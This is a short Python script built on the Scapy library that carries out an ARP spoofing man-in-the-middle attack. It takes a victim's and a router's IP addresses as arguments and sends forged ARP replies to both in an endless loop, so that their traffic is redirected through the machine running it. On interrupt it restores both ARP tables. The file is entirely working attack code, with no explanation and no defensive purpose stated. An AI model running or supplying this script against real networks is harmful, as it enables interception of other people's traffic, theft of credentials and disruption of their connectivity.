from scapy.all import *
import sys

#send packet to fake the ARP table
def arp_spoof (dest_ip, dest_mac, source_ip):
    packet = ARP(op="is-at", psrc= source_ip, hwdst=dest_mac, pdst=dest_ip )
    send(packet/ Padding(load = "X"*18), iface="eth0", verbose=False)

#send packets to restore ARP table to original state
def arp_restore (dest_ip, dest_mac, source_ip, source_mac):
    packet = ARP(op="is-at", hwsrc=source_mac, psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
    send(packet/ Padding(load = "X"*18), iface="eth0", verbose=False)
	
def main():
    victim_ip =  sys.argv[1]
    print(victim_ip)
    router_ip =  sys.argv[2]
    print(router_ip)
    victim_mac =  getmacbyip(victim_ip)
    print(victim_mac)
    router_mac =  getmacbyip(router_ip)
    print(router_mac)
    try:
        print("Sending spoofed ARP packets")
        while True: 
            arp_spoof(victim_ip, victim_mac, router_ip) 
            arp_spoof(router_ip, router_mac, victim_ip)
    except KeyboardInterrupt:
        print("Restoring ARP Tables")
        arp_restore(router_ip, router_mac, victim_ip, victim_mac)
        arp_restore(victim_ip, victim_mac, router_ip, router_mac)
    quit()

main()
